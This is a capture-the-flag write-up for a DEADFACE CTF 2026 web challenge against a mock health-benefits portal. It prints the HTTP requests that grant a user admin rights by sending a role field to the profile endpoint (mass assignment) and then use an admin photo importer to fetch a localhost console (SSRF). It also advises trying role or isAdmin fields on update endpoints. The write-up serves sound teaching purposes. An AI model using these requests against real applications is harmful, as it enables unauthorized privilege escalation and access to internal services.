---
title: I Want to be a Real Boy (4 of 4 series)
tags:
  - DEADFACE CTF 2026
  - Web
---

# I Want to be a Real Boy (4 of 4 series)

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Web |
| **Points** | 250 |
| **Author** | @RP-01? |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) |

## Challenge

> When it comes to a web application, the admin is king. We have already discovered so much data, do you think we can become an admin as well?
>
> NOTE: This IP address is hosting other ports for other challenges, only the website is relevant to this challenge.
>
> NOTE: Do not perform port scanning on this host, only the address and port discovered in OSINT matter.

Target: `http://45.79.200.170:3000/`, the HealthSpark employer portal.

## Solution

We already had `john.smith` / `Locked_In_And_Ready` from earlier in the series. His JWT says `"role":"user"`, and the challenge wants us to be admin.

### Becoming admin

The profile update endpoint takes JSON and signs a fresh JWT from whatever fields you send. So we sent a role:

```http
POST /api/profile HTTP/1.1
Host: 45.79.200.170:3000
Authorization: Bearer <john.smith user JWT>
Content-Type: application/json

{"role":"admin"}
```

```json
{"message":"Profile updated.","token":"<new JWT>","profile":{"role":"admin","sub":"john.smith","departmentid":10685,"name":"John Smith"}}
```

The new token decodes to `"role":"admin"`. That was it.

### The admin tool

The dashboard has an **Admin Tools → Member Photo Importer** panel. A comment says the UI shows for everyone but the server checks for admin, and that's true: with the old token, `POST /api/admin/fetch-photo` gives `{"error":"Administrator role required"}`. With the new one it works.

The importer fetches any URL from the app server itself, so it's an SSRF. No scanning needed, the internal admin console is on the app host's loopback:

```http
POST /api/admin/fetch-photo HTTP/1.1
Host: 45.79.200.170:3000
Authorization: Bearer <admin JWT>
Content-Type: application/json

{"url":"http://localhost:8080/"}
```

```text
HealthSpark — Internal Admin Console
...
admin_console_token: deadface{oh_you_shouldnt_be_here}
```

## Flag

!!! flag "Flag"
    `deadface{oh_you_shouldnt_be_here}`

## Takeaways

Two bugs chained: the profile endpoint let us pick our own role (mass assignment), and the admin photo importer fetched localhost for us. When an update endpoint hands back a new token, try adding `role` or `isAdmin` to the body.
